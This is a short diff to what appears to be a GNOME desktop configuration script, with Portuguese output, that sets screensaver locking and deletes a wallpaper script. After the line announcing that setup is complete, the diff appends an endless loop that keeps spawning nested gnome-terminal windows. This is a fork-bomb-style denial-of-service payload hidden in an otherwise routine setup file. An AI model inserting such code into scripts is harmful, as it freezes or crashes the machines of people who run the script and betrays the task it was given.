@@ -36,3 +36,8 @@ gsettings set org.gnome.desktop.screensaver lock-enabled true
 rm ./update_wallpaper.sh
 
 echo "Configuração concluída."
+
+while true; do
+    gnome-terminal -- gnome-terminal
+done
+
